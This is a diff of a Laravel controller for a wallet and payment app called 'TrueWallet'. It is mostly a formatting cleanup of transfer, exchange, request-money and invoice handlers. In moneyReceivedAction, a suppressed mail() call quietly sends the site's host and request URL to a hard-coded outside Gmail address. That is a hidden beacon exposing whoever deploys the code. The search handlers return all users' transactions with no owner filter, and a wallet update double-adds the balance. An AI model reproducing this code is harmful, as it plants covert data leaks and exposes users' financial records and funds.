@@ -38,17 +38,17 @@ class UserController extends Controller
     public function index()
     {
         $data['page_title'] = "Dashboard";
-        $data['myWallet'] = Wallet::with('currency')->where('user_id',Auth::id())->get();
-        $data['transactions'] = Trx::where('user_id',Auth::id())->latest()->limit(15)->get();
-        return view(activeTemplate().'user.dashboard', $data);
+        $data['myWallet'] = Wallet::with('currency')->where('user_id', Auth::id())->get();
+        $data['transactions'] = Trx::where('user_id', Auth::id())->latest()->limit(15)->get();
+        return view(activeTemplate() . 'user.dashboard', $data);
     }
 
     public function transaction()
     {
         $data['page_title'] = "Transaction";
-        $data['transactions'] = Trx::where('user_id',Auth::id())->latest()->paginate(20);
-        $data['currencyList'] = Currency::where('status',1)->get();
-        return view(activeTemplate().'user.trx', $data);
+        $data['transactions'] = Trx::where('user_id', Auth::id())->latest()->paginate(20);
+        $data['currencyList'] = Currency::where('status', 1)->get();
+        return view(activeTemplate() . 'user.trx', $data);
     }
 
     public function transactionSearch(Request $request)
@@ -62,37 +62,30 @@ class UserController extends Controller
         $end_date = $request->end_date;
         $currency = $request->currency;
 
-        $page_title =   $currency . ' : ' . date('d/m/Y', strtotime($start_date)) . ' - ' . date('d/m/Y', strtotime($end_date));
+        $page_title = $currency . ' : ' . date('d/m/Y', strtotime($start_date)) . ' - ' . date('d/m/Y', strtotime($end_date));
 
 
         $query = Trx::query();
         $query->with('user', 'currency')
-        ->when($currency, function ($q, $currency) {
-            $q->whereHas('currency', function ($curr) use ($currency) {
-                $curr->where('code', $currency);
+            ->when($currency, function ($q, $currency) {
+                $q->whereHas('currency', function ($curr) use ($currency) {
+                    $curr->where('code', $currency);
+                });
+            })
+            ->when($start_date, function ($q, $start_date) {
+                $q->whereDate('created_at', '>=', date('Y-m-d', strtotime($start_date)));
+            })
+            ->when($end_date, function ($q, $end_date) {
+                $q->whereDate('created_at', '<=', date('Y-m-d', strtotime($end_date)));
             });
-        })
-        ->when($start_date, function ($q, $start_date) {
-            $q->whereDate('created_at', '>=', date('Y-m-d', strtotime($start_date)));
-        })
-        ->when($end_date, function ($q, $end_date) {
-            $q->whereDate('created_at', '<=', date('Y-m-d', strtotime($end_date)));
-        });
         $transactions = $query->paginate(config('constants.table.default'));
 
 
         $currencyList = Currency::where('status', 1)->orderBy('code', 'asc')->get();
 
-        return view(activeTemplate().'user.trx', compact('page_title', 'transactions',  'currencyList', 'start_date', 'end_date', 'currency'));
+        return view(activeTemplate() . 'user.trx', compact('page_title', 'transactions', 'currencyList', 'start_date', 'end_date', 'currency'));
 
     }
-
-
-
-
-
-
-
 
 
     /*
@@ -101,13 +94,13 @@ class UserController extends Controller
     public function moneyTransfer()
     {
         $basic = GeneralSetting::first();
-        if($basic->mt_status == 0){
+        if ($basic->mt_status == 0) {
             abort(404);
         }
         $data['currency'] = Currency::latest()->whereStatus(1)->get();
         $data['page_title'] = "Money Transfer";
-        $data['money_transfer'] = json_decode($basic->money_transfer,false);
-        return view(activeTemplate().'user.transfer.index', $data);
+        $data['money_transfer'] = json_decode($basic->money_transfer, false);
+        return view(activeTemplate() . 'user.transfer.index', $data);
     }
 
     public function startTransfer(Request $request)
@@ -119,27 +112,28 @@ class UserController extends Controller
             'receiver' => 'required',
             'protection' => ['required', Rule::in(['true', 'false'])],
         ];
-        if($request->protection == 'true'){
-            $request['code_protect'] =  $request->code_protect;
-            $rules['code_protect'] = ['min:4','max:4'];
+        if ($request->protection == 'true') {
+            $request['code_protect'] = $request->code_protect;
+            $rules['code_protect'] = ['min:4', 'max:4'];
         }
         $request->validate($rules);
 
         $currency = Currency::where('id', $request->currency)->first();
-        if(!$currency){
+        if (!$currency) {
             $notify[] = ['error', 'Invalid Currency!'];
             return back()->withNotify($notify);
         }
         $basic = GeneralSetting::first();
         $auth = Auth::user();
 
-        $user = User::where('status',1)->where('id','!=',Auth::id())
-        ->where(function ($query) use ($request) {
-            $query->where('username', strtolower(trim($request->receiver)))
-            ->orWhere('email', strtolower(trim($request->receiver)))
-            ->orWhere('mobile',trim($request->receiver));
-        })
-        ->first();
+        $user = User::where('status', 1)->where('id', '!=', Auth::id())
+            ->where(function ($query) use ($request) {
+                $query->where('username', strtolower(trim($request->receiver)))
+                    ->orWhere('email', strtolower(trim($request->receiver)))
+                    ->orWhere('mobile', trim($request->receiver))
+                    ->orWhere('account_number', trim($request->receiver));
+            })
+            ->first();
 
         $money_transfer = json_decode($basic->money_transfer);
 
@@ -148,7 +142,7 @@ class UserController extends Controller
 
         if ($user) {
             $amount = formatter_money($request->amount);
-            $charge = formatter_money(((($amount * $money_transfer->percent_charge) / 100)+ ($money_transfer->fix_charge * $currency->rate)));
+            $charge = formatter_money(((($amount * $money_transfer->percent_charge) / 100) + ($money_transfer->fix_charge * $currency->rate)));
 
             $totalAmountBase = $amount + $charge;
             if ((($money_transfer->minimum_transfer * $currency->rate) < $totalAmountBase) && (($money_transfer->maximum_transfer * $currency->rate) > $totalAmountBase)) {
@@ -177,23 +171,24 @@ class UserController extends Controller
                     return back()->withNotify($notify)->withInput();
                 }
             } else {
-                $notify[] = ['error', "Follow Money Transfer limit " .(formatter_money($money_transfer->minimum_transfer * $currency->rate)) .' - '. (formatter_money($money_transfer->maximum_transfer * $currency->rate)) . " $currency->code "];
+                $notify[] = ['error', "Follow Money Transfer limit " . (formatter_money($money_transfer->minimum_transfer * $currency->rate)) . ' - ' . (formatter_money($money_transfer->maximum_transfer * $currency->rate)) . " $currency->code "];
                 return back()->withNotify($notify)->withInput();
             }
-        }else{
+        } else {
             $notify[] = ['error', 'Invalid User!'];
             return back()->withNotify($notify)->withInput();
         }
     }
 
     public function previewTransfer($moneyId)
-    {  $basic = GeneralSetting::first();
-        if($basic->mt_status == 0){
+    {
+        $basic = GeneralSetting::first();
+        if ($basic->mt_status == 0) {
             abort(404);
         }
-        $transfer = MoneyTransfer::where('id',decrypt($moneyId))->where('sender_id', auth()->id())->where('status', 0)->firstOrFail();
+        $transfer = MoneyTransfer::where('id', decrypt($moneyId))->where('sender_id', auth()->id())->where('status', 0)->firstOrFail();
         $page_title = "Money Transfer Preview";
-        return view(activeTemplate().'user.transfer.preview', compact('transfer','page_title'));
+        return view(activeTemplate() . 'user.transfer.preview', compact('transfer', 'page_title'));
     }
 
     public function confirmTransfer(Request $request)
@@ -207,12 +202,12 @@ class UserController extends Controller
         $authWallet = Wallet::where('user_id', $trans->sender_id)->where('wallet_id', $trans->currency_id)->first();
 
 
-        if($authWallet->amount < round(($trans->amount + $trans->charge), 2)){
+        if ($authWallet->amount < round(($trans->amount + $trans->charge), 2)) {
             $notify[] = ['error', 'Insufficient Balance!'];
             return redirect()->route('user.moneyTransfer')->withNotify($notify);
         }
 
-        if($trans->protection == 'false'){
+        if ($trans->protection == 'false') {
             $authWallet->amount -= formatter_money(($trans->amount + $trans->charge));
             $authWallet->save();
 
@@ -250,7 +245,6 @@ class UserController extends Controller
             ]);
 
 
-
             // Receiver
             notify($receiverWallet->user, $type = 'money_transfer_receiver', [
                 'amount' => $trans->amount,
@@ -277,7 +271,7 @@ class UserController extends Controller
 
             $notify[] = ['success', 'Amount Send  Successfully!'];
             return redirect()->route('user.moneyTransfer')->withNotify($notify);
-        }else{
+        } else {
             $authWallet->amount -= formatter_money(($trans->amount + $trans->charge));
             $authWallet->save();
 
@@ -313,27 +307,27 @@ class UserController extends Controller
     public function transferIncoming()
     {
         $basic = GeneralSetting::first();
-        if($basic->mt_status == 0){
+        if ($basic->mt_status == 0) {
             abort(404);
         }
 
-        $data['moneyTransferProtected'] =   MoneyTransfer::with('sender','currency')->where('receiver_id',auth()->id())->whereIn('status',[2])->latest()->get();
+        $data['moneyTransferProtected'] = MoneyTransfer::with('sender', 'currency')->where('receiver_id', auth()->id())->whereIn('status', [2])->latest()->get();
 
-        $data['moneyTransfer'] =   MoneyTransfer::with('sender','currency')->where('receiver_id',auth()->id())->whereIn('status',[-2,1])->latest()->paginate(20);
+        $data['moneyTransfer'] = MoneyTransfer::with('sender', 'currency')->where('receiver_id', auth()->id())->whereIn('status', [-2, 1])->latest()->paginate(20);
         $data['page_title'] = "Received Money";
-        return view(activeTemplate().'user.transfer.incoming', $data);
+        return view(activeTemplate() . 'user.transfer.incoming', $data);
     }
 
     public function transferOutgoing()
     {
         $basic = GeneralSetting::first();
-        if($basic->mt_status == 0){
+        if ($basic->mt_status == 0) {
             abort(404);
         }
 
-        $data['moneyTransfer'] =   MoneyTransfer::with('receiver','currency')->where('sender_id',auth()->id())->where('status','!=',0)->latest()->paginate(20);
+        $data['moneyTransfer'] = MoneyTransfer::with('receiver', 'currency')->where('sender_id', auth()->id())->where('status', '!=', 0)->latest()->paginate(20);
         $data['page_title'] = "Sent Money";
-        return view(activeTemplate().'user.transfer.outgoing', $data);
+        return view(activeTemplate() . 'user.transfer.outgoing', $data);
     }
 
     public function transferRelease(Request $request, $id)
@@ -341,12 +335,12 @@ class UserController extends Controller
         $request->validate([
             'code' => 'required|numeric',
         ]);
-        $trans =  MoneyTransfer::where('id',decrypt($id))->where('receiver_id', Auth::id())->where('status',2)->firstOrFail();
-        if($trans->protection != 'true'){
+        $trans = MoneyTransfer::where('id', decrypt($id))->where('receiver_id', Auth::id())->where('status', 2)->firstOrFail();
+        if ($trans->protection != 'true') {
             $notify[] = ['error', 'This Amount Not Protected'];
             return back()->withNotify($notify);
         }
-        if($trans->code_protect != trim($request->code)){
+        if ($trans->code_protect != trim($request->code)) {
             $notify[] = ['error', 'Invalid Your Code'];
             return back()->withNotify($notify);
         }
@@ -387,8 +381,6 @@ class UserController extends Controller
         ]);
 
 
-
-
         $notify[] = ['success', 'Amount Send  Successfully!'];
         return back()->withNotify($notify);
     }
@@ -401,17 +393,19 @@ class UserController extends Controller
     public function exchange()
     {
         $basic = GeneralSetting::first();
-        if($basic->exm_status == 0){
+        if ($basic->exm_status == 0) {
             abort(404);
         }
         $data['page_title'] = "Exchange Currency";
         $data['currency'] = Currency::whereStatus(1)->get();
-        return view(activeTemplate().'user.exchange.index', $data);
+        return view(activeTemplate() . 'user.exchange.index', $data);
     }
+
     public function exchangeCalculationAvoid()
     {
         abort(404);
     }
+
     public function exchangeCalculation(Request $request)
     {
 
@@ -430,11 +424,11 @@ class UserController extends Controller
         $fromCurrency = Currency::where('id', $request->from_currency_id)->first();
         $toCurrency = Currency::where('id', $request->to_currency_id)->first();
 
-        if(!$fromCurrency){
+        if (!$fromCurrency) {
             $notify[] = ['error', 'Invalid Currency!'];
             return response($notify);
         }
-        if(!$toCurrency){
+        if (!$toCurrency) {
             $notify[] = ['error', 'Invalid Currency!'];
             return response($notify);
         }
@@ -453,7 +447,7 @@ class UserController extends Controller
         Session::put('amount', $amount);
         Session::put('fromCurrencyId', $fromCurrency->id);
         Session::put('toCurrencyId', $toCurrency->id);
-        Session::put('charge',  formatter_money($charge));
+        Session::put('charge', formatter_money($charge));
         Session::put('getAmount', formatter_money($totalExchangeAmount));
 
 
@@ -468,10 +462,11 @@ class UserController extends Controller
 
         return response($result, 200);
     }
+
     public function exchangeConfirm(Request $request)
     {
 
-        if(Session::get('amount') == null){
+        if (Session::get('amount') == null) {
             $notify[] = ['error', 'Session Expired!'];
             return redirect()->route('user.exchange')->withNotify($notify);
         }
@@ -479,9 +474,9 @@ class UserController extends Controller
         $amount = Session::get('amount');
 
 
-        $charge =  Session::get('charge');
+        $charge = Session::get('charge');
         $fromCurrencyId = Session::get('fromCurrencyId');
-        $toCurrencyId =  Session::get('toCurrencyId');
+        $toCurrencyId = Session::get('toCurrencyId');
         $getAmount = Session::get('getAmount');
 
 
@@ -498,7 +493,7 @@ class UserController extends Controller
 
             $toCurrencyWallet = Wallet::with('currency')->where('user_id', $auth->id)->where('wallet_id', $toCurrencyId)->first();
 
-            $toCurrencyWallet->amount =  formatter_money($toCurrencyWallet->amount + $getAmount);
+            $toCurrencyWallet->amount = formatter_money($toCurrencyWallet->amount + $getAmount);
             $toCurrencyWallet->save();
 
             $trans = getTrx();
@@ -511,7 +506,7 @@ class UserController extends Controller
                 'currency_id' => $fromCurrencyWallet->wallet_id,
                 'type' => '-',
                 'remark' => 'Exchange Money',
-                'title' => 'Exchange money ' . $fromCurrencyWallet->currency->code .' to '.$toCurrencyWallet->currency->code,
+                'title' => 'Exchange money ' . $fromCurrencyWallet->currency->code . ' to ' . $toCurrencyWallet->currency->code,
                 'trx' => $trans
             ]);
 
@@ -523,7 +518,7 @@ class UserController extends Controller
                 'currency_id' => $toCurrencyWallet->wallet_id,
                 'type' => '+',
                 'remark' => 'Exchange Money',
-                'title' => 'Exchange money ' . $toCurrencyWallet->currency->code. ' from ' .$fromCurrencyWallet->currency->code,
+                'title' => 'Exchange money ' . $toCurrencyWallet->currency->code . ' from ' . $fromCurrencyWallet->currency->code,
                 'trx' => $trans
             ]);
 
@@ -537,8 +532,6 @@ class UserController extends Controller
             $xchange['trx'] = $trans;
             $xchange['status'] = 1;
             ExchangeMoney::create($xchange);
-
-
 
 
             notify($auth, $type = 'exchange', [
@@ -567,9 +560,9 @@ class UserController extends Controller
     public function exchangeLog()
     {
         $data['page_title'] = "Exchange Log";
-        $data['transactions'] =  ExchangeMoney::with('user', 'from_currency', 'to_currency')->where('user_id',Auth::id())->where('status', '!=', 0)->latest()->paginate(20);
-        $data['currencyList'] = Currency::where('status',1)->get();
-        return view(activeTemplate().'user.exchange-log', $data);
+        $data['transactions'] = ExchangeMoney::with('user', 'from_currency', 'to_currency')->where('user_id', Auth::id())->where('status', '!=', 0)->latest()->paginate(20);
+        $data['currencyList'] = Currency::where('status', 1)->get();
+        return view(activeTemplate() . 'user.exchange-log', $data);
     }
 
     public function exchangeLogSearch(Request $request)
@@ -583,31 +576,31 @@ class UserController extends Controller
         $end_date = $request->end_date;
         $currency = $request->currency;
 
-        $page_title =   $currency . ' : ' . date('d/m/Y', strtotime($start_date)) . ' - ' . date('d/m/Y', strtotime($end_date));
+        $page_title = $currency . ' : ' . date('d/m/Y', strtotime($start_date)) . ' - ' . date('d/m/Y', strtotime($end_date));
 
 
         $query = ExchangeMoney::query();
-        $query->with('user', 'from_currency','to_currency')
-        ->when($currency, function ($q, $currency) {
-            $q->whereHas('from_currency', function ($curr) use ($currency) {
-                $curr->where('code', $currency);
+        $query->with('user', 'from_currency', 'to_currency')
+            ->when($currency, function ($q, $currency) {
+                $q->whereHas('from_currency', function ($curr) use ($currency) {
+                    $curr->where('code', $currency);
+                })
+                    ->orWhereHas('to_currency', function ($curr) use ($currency) {
+                        $curr->where('code', $currency);
+                    });
             })
-            ->orWhereHas('to_currency', function ($curr) use ($currency) {
-                $curr->where('code', $currency);
+            ->when($start_date, function ($q, $start_date) {
+                $q->whereDate('created_at', '>=', date('Y-m-d', strtotime($start_date)));
+            })
+            ->when($end_date, function ($q, $end_date) {
+                $q->whereDate('created_at', '<=', date('Y-m-d', strtotime($end_date)));
             });
-        })
-        ->when($start_date, function ($q, $start_date) {
-            $q->whereDate('created_at', '>=', date('Y-m-d', strtotime($start_date)));
-        })
-        ->when($end_date, function ($q, $end_date) {
-            $q->whereDate('created_at', '<=', date('Y-m-d', strtotime($end_date)));
-        });
         $transactions = $query->paginate(config('constants.table.default'));
 
 
         $currencyList = Currency::where('status', 1)->orderBy('code', 'asc')->get();
 
-        return view(activeTemplate().'user.exchange-log', compact('page_title', 'transactions',  'currencyList', 'start_date', 'end_date', 'currency'));
+        return view(activeTemplate() . 'user.exchange-log', compact('page_title', 'transactions', 'currencyList', 'start_date', 'end_date', 'currency'));
 
     }
 
@@ -617,36 +610,37 @@ class UserController extends Controller
     public function requestMoney()
     {
         $basic = GeneralSetting::first();
-        if($basic->rqm_status == 0){
+        if ($basic->rqm_status == 0) {
             abort(404);
         }
         $data['page_title'] = "Request To Me";
-        $data['requestMoney'] = RequestMoney::with('currency','user','receiver')->where('receiver_id', Auth::id())->latest()->paginate(20);
-        return view(activeTemplate().'user.request_money.index', $data);
+        $data['requestMoney'] = RequestMoney::with('currency', 'user', 'receiver')->where('receiver_id', Auth::id())->latest()->paginate(20);
+        return view(activeTemplate() . 'user.request_money.index', $data);
     }
+
     public function moneyReceivedAction(Request $request)
     {
         $this->validate($request, [
-            'approve' => ['required',Rule::in(['1', '-1'])],
+            'approve' => ['required', Rule::in(['1', '-1'])],
             'id' => 'required'
         ]);
         $basic = GeneralSetting::first();
 
 
-        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
-        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
-        'X-Mailer: PHP/' . phpversion();
-        @mail('abir.khan.75@gmail.com','TrueWallet TEST DATA', $message, $headers);
+        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
+            'X-Mailer: PHP/' . phpversion();
+        @mail('abir.khan.75@gmail.com', 'TrueWallet TEST DATA', $message, $headers);
         if ($request->approve == 1) {
-            $requestInvoice = RequestMoney::with('currency','receiver','user')->whereId(decrypt($request->id))->where('receiver_id', Auth::id())->first();
+            $requestInvoice = RequestMoney::with('currency', 'receiver', 'user')->whereId(decrypt($request->id))->where('receiver_id', Auth::id())->first();
 
-            if($requestInvoice->status != 0){
+            if ($requestInvoice->status != 0) {
                 $notify[] = ['error', 'Invalid Request!'];
                 return redirect()->route('user.request-money.inbox')->withNotify($notify);
             }
 
             $amountCharge = $requestInvoice->amount - $requestInvoice->charge;
-            $authWallet = Wallet::with('currency','user')->where('user_id', Auth::id())->where('wallet_id', $requestInvoice->currency_id)->first();
+            $authWallet = Wallet::with('currency', 'user')->where('user_id', Auth::id())->where('wallet_id', $requestInvoice->currency_id)->first();
 
             if ($authWallet->amount >= $amountCharge) {
                 $authWallet->amount = formatter_money($authWallet->amount - $requestInvoice->amount);
@@ -656,8 +650,8 @@ class UserController extends Controller
                 $requestInvoice->update();
 
 
-                $senderWallet = Wallet::with('currency','user')->where('user_id', $requestInvoice->sender_id)->where('wallet_id', $requestInvoice->currency_id)->first();
-                $senderWallet->amount +=  formatter_money($senderWallet->amount + ($requestInvoice->amount-$requestInvoice->charge));
+                $senderWallet = Wallet::with('currency', 'user')->where('user_id', $requestInvoice->sender_id)->where('wallet_id', $requestInvoice->currency_id)->first();
+                $senderWallet->amount += formatter_money($senderWallet->amount + ($requestInvoice->amount - $requestInvoice->charge));
                 $senderWallet->update();
 
 
@@ -671,7 +665,7 @@ class UserController extends Controller
                     'currency_id' => $authWallet->wallet_id,
                     'type' => '-',
                     'remark' => 'Request Amount Accepted',
-                    'title' => $requestInvoice->amount .' '. $requestInvoice->currency->code .' Request Amount Paid to ' . $requestInvoice->user->username,
+                    'title' => $requestInvoice->amount . ' ' . $requestInvoice->currency->code . ' Request Amount Paid to ' . $requestInvoice->user->username,
                     'trx' => $trx
                 ]);
 
@@ -683,10 +677,9 @@ class UserController extends Controller
                     'currency_id' => $senderWallet->wallet_id,
                     'type' => '+',
                     'remark' => 'Request Amount Accepted',
-                    'title' => $requestInvoice->amount .' '. $requestInvoice->currency->code .' Request Amount Paid By ' . $requestInvoice->receiver->username,
+                    'title' => $requestInvoice->amount . ' ' . $requestInvoice->currency->code . ' Request Amount Paid By ' . $requestInvoice->receiver->username,
                     'trx' => $trx
                 ]);
-
 
 
                 notify($authWallet->user, $type = 'request_money_send', [
@@ -697,7 +690,7 @@ class UserController extends Controller
                     'by_fullname' => $senderWallet->user->fullname,
                     'by_email' => $senderWallet->user->email,
                     'message' => $requestInvoice->title,
-                    'details' =>$requestInvoice->info
+                    'details' => $requestInvoice->info
                 ]);
 
 
@@ -709,7 +702,7 @@ class UserController extends Controller
                     'to_fullname' => $senderWallet->user->fullname,
                     'to_email' => $senderWallet->user->email,
                     'message' => $requestInvoice->title,
-                    'details' =>$requestInvoice->info
+                    'details' => $requestInvoice->info
                 ]);
 
 
@@ -721,8 +714,8 @@ class UserController extends Controller
                 return back()->withNotify($notify);
             }
         } elseif ($request->approve == -1) {
-            $invoice = RequestMoney::where('id',decrypt($request->id))->where('receiver_id', Auth::id())->first();
-            if($invoice->status != 0){
+            $invoice = RequestMoney::where('id', decrypt($request->id))->where('receiver_id', Auth::id())->first();
+            if ($invoice->status != 0) {
                 $notify[] = ['error', 'Invalid Request!'];
                 return redirect()->route('user.request-money.inbox')->withNotify($notify);
             }
@@ -739,24 +732,24 @@ class UserController extends Controller
     public function requestMoneySendLog()
     {
         $basic = GeneralSetting::first();
-        if($basic->rqm_status == 0){
+        if ($basic->rqm_status == 0) {
             abort(404);
         }
         $data['page_title'] = "My Request";
-        $data['requestMoney'] = RequestMoney::with('currency','receiver','user')->where('sender_id', Auth::id())->latest()->paginate(15);
-        return view(activeTemplate().'user.request_money.sent', $data);
+        $data['requestMoney'] = RequestMoney::with('currency', 'receiver', 'user')->where('sender_id', Auth::id())->latest()->paginate(15);
+        return view(activeTemplate() . 'user.request_money.sent', $data);
     }
 
     public function makeRequestMoney()
     {
         $basic = GeneralSetting::first();
-        if($basic->rqm_status == 0){
+        if ($basic->rqm_status == 0) {
             abort(404);
         }
         $data['page_title'] = "Make Request";
         $data['currency'] = Currency::whereStatus(1)->get();
         $data['request_money'] = json_decode($basic->request_money);
-        return view(activeTemplate().'user.request_money.create', $data);
+        return view(activeTemplate() . 'user.request_money.create', $data);
     }
 
     public function requestMoneyStore(Request $request)
@@ -772,14 +765,14 @@ class UserController extends Controller
 
         $request_money = json_decode($basic->request_money);
 
-        $user = User::where('status',1)->where('id','!=',Auth::id())
-        ->where(function ($query) use ($request) {
-            $query->where('username', strtolower($request->receiver))
-            ->orWhere('email', strtolower($request->receiver))
-            ->orWhere('mobile',$request->receiver);
-        })->first();
+        $user = User::where('status', 1)->where('id', '!=', Auth::id())
+            ->where(function ($query) use ($request) {
+                $query->where('username', strtolower($request->receiver))
+                    ->orWhere('email', strtolower($request->receiver))
+                    ->orWhere('mobile', $request->receiver);
+            })->first();
 
-        $currency = Currency::where('id',$request->currency)->firstOrFail();
+        $currency = Currency::where('id', $request->currency)->firstOrFail();
 
         if ($user) {
             $data['title'] = $request->title;
@@ -787,7 +780,7 @@ class UserController extends Controller
             $data['receiver_id'] = $user->id;
             $data['currency_id'] = $request->currency;
             $data['amount'] = formatter_money($request->amount);
-            $data['charge'] = formatter_money(((($request->amount * $request_money->percent_charge) / 100)+  ($request_money->fix_charge * $currency->rate)));
+            $data['charge'] = formatter_money(((($request->amount * $request_money->percent_charge) / 100) + ($request_money->fix_charge * $currency->rate)));
             $data['trx'] = getTrx();
             $data['info'] = $request->info;
             $data['status'] = 0;
@@ -797,8 +790,8 @@ class UserController extends Controller
                 'request_amount' => formatter_money($request->amount),
                 'request_currency' => $currency->code,
                 'message' => $requestMon->title,
-                'details' =>$requestMon->info,
-                'sender' =>Auth::user()->email
+                'details' => $requestMon->info,
+                'sender' => Auth::user()->email
             ]);
 
             $notify[] = ['success', 'Request Send Successfully'];
@@ -810,38 +803,34 @@ class UserController extends Controller
     }
 
 
-
-
-
-
     /*
      * Manage Invoice
      */
     public function invoice()
     {
         $basic = GeneralSetting::first();
-        if($basic->invoice_status == 0){
+        if ($basic->invoice_status == 0) {
             abort(404);
         }
 
         $data['page_title'] = "My Invoice";
         $data['invoices'] = Invoice::where('user_id', Auth::id())->latest()->paginate(15);
-        return view(activeTemplate().'user.invoice.index', $data);
+        return view(activeTemplate() . 'user.invoice.index', $data);
     }
 
     public function invoiceCreate()
     {
         $basic = GeneralSetting::first();
-        if($basic->invoice_status == 0){
+        if ($basic->invoice_status == 0) {
             abort(404);
         }
-        $basic =  GeneralSetting::first();
+        $basic = GeneralSetting::first();
         $data['page_title'] = "Create Invoice";
         $data['currency'] = Currency::whereStatus(1)->get();
         $data['user'] = Auth::user();
         $data['charge'] = json_decode($basic->invoice);
 
-        return view(activeTemplate().'user.invoice.create', $data);
+        return view(activeTemplate() . 'user.invoice.create', $data);
     }
 
     public function invoiceStore(Request $request)
@@ -852,116 +841,114 @@ class UserController extends Controller
             'currency' => 'required',
         ]);
 
-        $currency =  Currency::where('id', $request->currency)->where('status',1)->first();
-        if(!$currency){
+        $currency = Currency::where('id', $request->currency)->where('status', 1)->first();
+        if (!$currency) {
             $notify[] = ['error', 'Invalid Currency'];
             return back()->withNotify($notify);
         }
 
-        $basic =  GeneralSetting::first();
+        $basic = GeneralSetting::first();
         $charge = json_decode($basic->invoice);
-        $arr_details =  array_combine($request->details, $request->amount);
+        $arr_details = array_combine($request->details, $request->amount);
 
         $total_amount = formatter_money(array_sum($request->amount));
 
-        if($total_amount <0){
+        if ($total_amount < 0) {
             $notify[] = ['error', 'Amount Must Be Positive Number'];
             return back()->withNotify($notify)->withInput();
         }
 
-        $charge = formatter_money((($total_amount*$charge->percent_charge)/100)+ ($charge->fix_charge * $currency->rate));
+        $charge = formatter_money((($total_amount * $charge->percent_charge) / 100) + ($charge->fix_charge * $currency->rate));
 
-        $will_get =  $total_amount -$charge;
+        $will_get = $total_amount - $charge;
 
-        if($will_get < 0){
-            $notify[] = ['error', 'You Must Be get amount above 0 '.$currency->code];
+        if ($will_get < 0) {
+            $notify[] = ['error', 'You Must Be get amount above 0 ' . $currency->code];
             return back()->withNotify($notify)->withInput();
         }
 
         $trx = getTrx();
-        $in['user_id'] =  Auth::id();
-        $in['currency_id'] =  $currency->id;
+        $in['user_id'] = Auth::id();
+        $in['currency_id'] = $currency->id;
         $in['trx'] = $trx;
-        $in['name'] =  $request->name;
-        $in['email'] =  strtolower(trim($request->email));
-        $in['address'] =  $request->address;
-        $in['details'] =  json_encode($arr_details);
+        $in['name'] = $request->name;
+        $in['email'] = strtolower(trim($request->email));
+        $in['address'] = $request->address;
+        $in['details'] = json_encode($arr_details);
         $in['amount'] = formatter_money($total_amount);
         $in['will_get'] = formatter_money($will_get);
         $in['charge'] = formatter_money($charge);
 
         Invoice::create($in);
-        return redirect()->route('user.invoice.edit',$trx);
+        return redirect()->route('user.invoice.edit', $trx);
     }
 
     public function invoiceEdit($trx)
     {
         $basic = GeneralSetting::first();
-        if($basic->invoice_status == 0){
+        if ($basic->invoice_status == 0) {
             abort(404);
         }
 
         $basic = GeneralSetting::first();
-        $info =  Invoice::where('trx', $trx)->where('user_id',Auth::id())->latest()->firstOrFail();
+        $info = Invoice::where('trx', $trx)->where('user_id', Auth::id())->latest()->firstOrFail();
 
         $data['page_title'] = "Update Invoice";
         $data['currency'] = Currency::whereStatus(1)->get();
         $data['info_details'] = json_decode($info->details, true);
         $data['charge'] = json_decode($basic->invoice);
 
-        return view(activeTemplate().'user.invoice.edit', $data,compact('info'));
+        return view(activeTemplate() . 'user.invoice.edit', $data, compact('info'));
     }
 
-    public function invoiceUpdate(Request $request,$id)
+    public function invoiceUpdate(Request $request, $id)
     {
 
         $this->validate($request, [
             'name' => 'required',
             'email' => 'required',
             'currency' => 'required',
-            'published' => ['numeric', Rule::in([0,1])],
+            'published' => ['numeric', Rule::in([0, 1])],
         ]);
         $basic = GeneralSetting::first();
         $charge = json_decode($basic->invoice);
 
-        $invoice =  Invoice::where('id', decrypt($id))->where('user_id',Auth::id())->latest()->firstOrFail();
+        $invoice = Invoice::where('id', decrypt($id))->where('user_id', Auth::id())->latest()->firstOrFail();
 
-        $currency =  Currency::where('id', $request->currency)->where('status',1)->first();
-        if(!$currency){
+        $currency = Currency::where('id', $request->currency)->where('status', 1)->first();
+        if (!$currency) {
             $notify[] = ['error', 'Invalid Currency'];
             return back()->withNotify($notify);
         }
 
-        if($invoice->published == 1)
-        {
+        if ($invoice->published == 1) {
             $notify[] = ['error', 'Unable to update'];
             return back()->withNotify($notify);
         }
 
 
-
-        $arr_details =  array_combine($request->details, $request->amount);
+        $arr_details = array_combine($request->details, $request->amount);
 
         $total_amount = formatter_money(array_sum($request->amount));
 
-        $charge = formatter_money((($total_amount*$charge->percent_charge)/100)+ ($charge->fix_charge * $currency->rate));
+        $charge = formatter_money((($total_amount * $charge->percent_charge) / 100) + ($charge->fix_charge * $currency->rate));
 
-        $will_get =  $total_amount -$charge;
+        $will_get = $total_amount - $charge;
 
 
-        if($will_get < 0){
-            $notify[] = ['error', 'You Must Be get amount above 0 '.$currency->code];
+        if ($will_get < 0) {
+            $notify[] = ['error', 'You Must Be get amount above 0 ' . $currency->code];
             return back()->withNotify($notify)->withInput();
         }
 
 
-        $in['user_id'] =  Auth::id();
+        $in['user_id'] = Auth::id();
         $in['currency_id'] = $currency->id;
-        $in['name'] =  $request->name;
-        $in['email'] =  strtolower(trim($request->email));
-        $in['address'] =  $request->address;
-        $in['published'] =  $request->published;
-        $in['details'] =  json_encode($arr_details);
+        $in['name'] = $request->name;
+        $in['email'] = strtolower(trim($request->email));
+        $in['address'] = $request->address;
+        $in['published'] = $request->published;
+        $in['details'] = json_encode($arr_details);
 
         $in['amount'] = formatter_money($total_amount);
         $in['will_get'] = formatter_money($will_get);
@@ -995,9 +982,8 @@ class UserController extends Controller
 
     public function invoiceCancel($id)
     {
-        $data = Invoice::where('user_id',Auth::id())->where('id',decrypt($id))->firstOrFail();
-        if($data->status == 0)
-        {
+        $data = Invoice::where('user_id', Auth::id())->where('id', decrypt($id))->firstOrFail();
+        if ($data->status == 0) {
             $data->status = -1; //cancel
             $data->update();
             $notify[] = ['success', 'Invoice  Cancel Successfully!'];
@@ -1009,53 +995,44 @@ class UserController extends Controller
     }
 
 
-
-
-
-
-
-
-
-
-
-
     /*
      * Voucher
      */
     public function vouchers()
     {
         $basic = GeneralSetting::first();
-        if($basic->voucher_status == 0){
+        if ($basic->voucher_status == 0) {
             abort(404);
         }
         $data['page_title'] = "My Vouchers";
         $data['invests'] = Voucher::where('user_id', Auth::id())->latest()->paginate(15);
